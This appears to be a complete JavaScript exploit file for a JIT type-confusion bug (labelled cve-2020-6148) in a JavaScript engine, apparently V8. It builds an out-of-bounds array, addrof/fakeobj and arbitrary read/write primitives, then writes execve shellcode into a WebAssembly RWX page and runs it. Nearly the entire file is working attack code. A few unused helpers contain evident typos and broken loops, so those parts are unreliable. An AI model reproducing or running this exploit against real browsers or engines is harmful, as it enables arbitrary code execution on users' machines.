/*************************************************************
 * File Name: exp.js
 * 
 * Created on: 2020-02-26 17:12:42
 * Author: raycp
 * 
 * Last Modified: 2020-02-28 06:12:05
 * Description: exp for cve-2020-6148 
************************************************************/
const MAX_ITERATIONS = 0x10000;
var maxSize = 1020*4;

var buf =new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var bigUint64 = new BigUint64Array(buf);
var uint32 = new Uint32Array(buf);
// Floating point to 64-bit unsigned integer
function f2i(f)
{
    float64[0] = f;
    return bigUint64[0];
}
// 64-bit unsigned integer to Floating point
function i2f(i)
{
    bigUint64[0] = i;
    return float64[0];
}

function f2half(val)
{
    float64[0]= val;
    let tmp = Array.from(uint32);
    return tmp;
}

function half2f(val)
{
    uint32.set(val);
    return float64[0];
}
// 64-bit unsigned integer to hex
function hex(i)
{
    return "0x"+i.toString(16).padStart(16, "0");
}

function wasm_func() {
    var wasmImports = {
        env: {
            puts: function puts (index) {
                print(utf8ToString(h, index));
            }
        }
    };
    
    var buffer = new Uint8Array([0,97,115,109,1,0,0,0,1,137,128,128,128,0,2,
        96,1,127,1,127,96,0,0,2,140,128,128,128,0,1,3,101,110,118,4,112,117,
        116,115,0,0,3,130,128,128,128,0,1,1,4,132,128,128,128,0,1,112,0,0,5,
        131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,146,128,128,128,0,2,6,
        109,101,109,111,114,121,2,0,5,104,101,108,108,111,0,1,10,141,128,128,
        128,0,1,135,128,128,128,0,0,65,16,16,0,26,11,11,146,128,128,128,0,1,0,
        65,16,11,12,72,101,108,108,111,32,87,111,114,108,100,0]);
    let m = new WebAssembly.Instance(new WebAssembly.Module(buffer),wasmImports);
    let h = new Uint8Array(m.exports.memory.buffer);
    return m.exports.hello;  
}
// wasm obj
func = wasm_func();
//%DebugPrint(func);
//%SystemBreak();
// gc function to move data to old space
function gc() {
    for (let i = 0; i < 100; i++) {
        new ArrayBuffer(0x100000);
    }
}

//var bb = [i2f(0x80406e908241880),i2f(0x80406e908241891), 2.2];
//%DebugPrint(bb);
//%SystemBreak();
var vulnArray = [,,,,,,,,,,,,,, 1.1, 2.2, 3.3];
vulnArray.pop();
vulnArray.pop();
vulnArray.pop();
//var vulnArray = [,,,, 1.1, 2.2, 3.3];
var oobArray;
var ab;
var objArray;
var bigUintArray;
function empty() {}
function evil(optional) {
    vulnArray.push(typeof(Reflect.construct(empty, arguments, optional)) === Proxy? 1.1: 8.063e-320);  // print (i2f(maxSize<<1)) ==> 8.063e-320
    for (let i=0; i<MAX_ITERATIONS; i++) {} // trigger optimization
}

let p = new Proxy(Object, {
    get: () => {
        //%DebugPrint(vulnArray);
        //%SystemBreak();
        vulnArray[0] = {};
        oobArray = [1.1, 2.2];
        ab = new ArrayBuffer(0x200);
        objArray = {m:0xdead, n:func}; 
        bigUintArray = new BigUint64Array(6);
        bigUintArray[0] = 0x1234n;
        bigUintArray[1] = 0x5678n;
        //%DebugPrint(vulnArray);
        //%DebugPrint(oobArray);
        //%DebugPrint(ab);
        //%DebugPrint(bigIntArray);

        //%SystemBreak();
        return Object.prototype;
    }
});

function VulnEntry(func) {
    for (let i=0; i<MAX_ITERATIONS; i++) {}; // trigger optimization
    return evil(func);
}

function GetOOBArray()
{
    for(let i=0; i<MAX_ITERATIONS; i++) {
        empty();
    }
    VulnEntry(empty);
    VulnEntry(empty);
    VulnEntry(p);
}
GetOOBArray();
print("[+] oobArray length: " + oobArray.length);

function AddrOf(obj)
{
    objArray.n = obj;
    for(let i=0; i<maxSize; i++) {
        let half = f2half(oobArray[i]);
        if( half[0] == (0xdead<<1) ) {
            //print("123");
            ret = half[1];
            break;
        }
        else if( half[1] == (0xdead<<1) ) {
            //print("456");
            ret = f2half(oobArray[i+1])[0];
            break;
        }
    }

    return BigInt(ret)
}

function FakeObj(addr)
{
    for(let i=0; i<maxSize; i++) {
        let half = f2half(oobArray[i]);
        if(half[0] == (oxdead<<1)) {
            half[1] = addr;
            oobArray[i] = half2f(half);
            return objArray.n;
        }
        else if(half[1] == (0xdead<<1)) {
            half = f2half(oobArray[i+1]);
            half[0] = addr;
            oobArray[i+1] = half2f(half);
            return objArray.n;
        }
    } 
}

var floatArrayBigBaseIdx = 0;
var floatArrayBigExternalIdx = 0;
for(let i=0; i<maxSize; i++) {
    if(f2i(oobArray[i]) == 0x1234) {

        floatArrayBigBaseIdx = i + 12;
        floatArrayBigExternalIdx = i + 11;
        floatArrayBigLenIdx = i+10;
        console.log("[+] float idx of big uint array base addr is: "+hex(floatArrayBigBaseIdx));
        console.log("[+] float idx of big uint array external addr is: "+hex(floatArrayBigExternalIdx));
        break;
    }
}

var bigUintArrayLen = f2i(oobArray[floatArrayBigLenIdx]);
var bigUintArrayBasePtr = f2i(oobArray[floatArrayBigBaseIdx]);
var bigUintArrayExternalPtr = f2i(oobArray[floatArrayBigExternalIdx]);

var compressHeapHighAddr = bigUintArrayExternalPtr & 0xffffffff00000000n;
print ("[+] heap high addr: " + hex(compressHeapHighAddr));


function InHeapRead64(addr)
{
    oobArray[floatArrayBigBaseIdx] = i2f(addr-0x8n);
    let ret = bigUintArray[0];
    oobArray[floatArrayBigBaseIdx] = i2f(bigUintArrayBasePtr);
    return ret;

}

function InHeapWrite64(addr, val)
{

    oobArray[floatArrayBigExternalIdx] = i2f(addr-0x8n);
    bigUintArray[0] = val;
    oobArray[floatArrayBigExternalIdx] = i2f(bigUintArrayExternalPtr);
    return;
}

function ByteToBigIntArray(payload)
{

    let sc = []
    let tmp = 0n;
    let lenInt = BigInt(Math.floor(payload.length/8))
    for (let i = 0n; i < lenInt; i += 1n) {
        tmp = 0n;
        for(let j=0n; j<8n; j++){
            tmp += BigInt(payload[i*8n+j])*(0x1n<<(8n*j));
        }
        sc.push(tmp);
    }

    let len = payload.length%8;
    tmp = 0n;
    for(let i=0n; i<len; i++){
        tmp += BigInt(payload[lenInt*8n+i])*(0x1n<<(8n*i));
    }
    sc.push(tmp);
    return sc;
}

function InHeapWrite(addr, payload)
{
    sc = ByteToBigIntArray(payload);

    oobArray[floatArrayBigLenIdx] = i2f(payload.length);
    oobArray[floatArrayBigBaseIdx] = i2f(addr-0x8n);

    for(let i = 0; i<sc.length; i+=i) {
        bigIntArray[i] = sc[i];
    }
    
    oobArray[floatArrayBigBaseIdx] = i2f(bigUintArrayBasePtr);
    oobArray[floatArrayBigLenIdx] = bigUintArrayLen;
}

function ArbitratyWrite(addr, payload)
{

    sc = ByteToBigIntArray(payload);

    oobArray[floatArrayBigLenIdx] = i2f(BigInt(sc.length));
    oobArray[floatArrayBigBaseIdx] = i2f(0n);
    oobArray[floatArrayBigExternalIdx] = i2f(addr);
    for(let i = 0; i<sc.length; i+=1) {
        bigUintArray[i] = sc[i];
    }

    oobArray[floatArrayBigLenIdx] = bigUintArrayLen;
    oobArray[floatArrayBigBaseIdx] = bigUintArrayBasePtr;
    oobArray[floatArrayBigExternalIdx] = bigUintArrayExternalPtr;
}

var wasmObjAddr = AddrOf(func);
var sharedInfoAddr = InHeapRead64(wasmObjAddr+0xcn)&0xffffffffn;
var wasmExportedFunctionDataAddr = InHeapRead64(sharedInfoAddr+4n)&0xffffffffn;
var instanceAddr = InHeapRead64(wasmExportedFunctionDataAddr+0x8n)&0xffffffffn;
var rwxAddr = InHeapRead64(instanceAddr+0x68n);
//%DebugPrint(func);
console.log("[+] wasm obj addr: "+hex(wasmObjAddr));
console.log("[+] wasm shared info addr: "+hex(sharedInfoAddr));
console.log("[+] wasmExportedFunctionData addr addr: "+hex(wasmExportedFunctionDataAddr));
console.log("[+] instance  addr addr: "+hex(instanceAddr));
console.log("[+] rwx addr: "+hex(rwxAddr));

var shellcode = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 121, 98,
    96, 109, 98, 1, 1, 72, 49, 4, 36, 72, 184, 47, 117, 115, 114, 47, 98,
    105, 110, 80, 72, 137, 231, 104, 59, 49, 1, 1, 129, 52, 36, 1, 1, 1, 1,
    72, 184, 68, 73, 83, 80, 76, 65, 89, 61, 80, 49, 210, 82, 106, 8, 90,
    72, 1, 226, 82, 72, 137, 226, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72,
    184, 121, 98, 96, 109, 98, 1, 1, 1, 72, 49, 4, 36, 49, 246, 86, 106, 8,
    94, 72, 1, 230, 86, 72, 137, 230, 106, 59, 88, 15, 5];
ArbitratyWrite(rwxAddr, shellcode);
//print(payload.length);
func();

